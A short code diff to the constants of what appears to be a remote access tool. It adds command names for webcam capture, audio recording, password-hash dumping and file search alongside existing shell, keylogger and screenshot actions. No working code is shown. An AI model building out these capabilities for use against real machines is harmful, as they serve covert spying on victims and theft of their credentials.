@@ -34,7 +34,6 @@ MAX_TOTAL_CONNECTIONS = 100
 RATE_LIMIT_BAN_SECONDS = 60
 
 HANDSHAKE_ACTION = "handshake"
-# Temporary wire check; remove when real commands land.
 TEST_ACTION = "test"
 HELP_ACTION = "help"
 DOWNLOAD_ACTION = "download"
@@ -42,6 +41,12 @@ UPLOAD_ACTION = "upload"
 SHELL_ACTION = "shell"
 SCREENSHOT_ACTION = "screenshot"
 KEYLOGGER_ACTION = "keylogger"
+WEBCAM_SNAPSHOT_ACTION = "webcam_snapshot"
+WEBCAM_STREAM_ACTION = "webcam_stream"
+HASHDUMP_ACTION = "hashdump"
+IPCONFIG_ACTION = "ipconfig"
+RECORD_AUDIO_ACTION = "record_audio"
+SEARCH_ACTION = "search"
 
 # OS Types
 OS_WINDOWS = "windows"
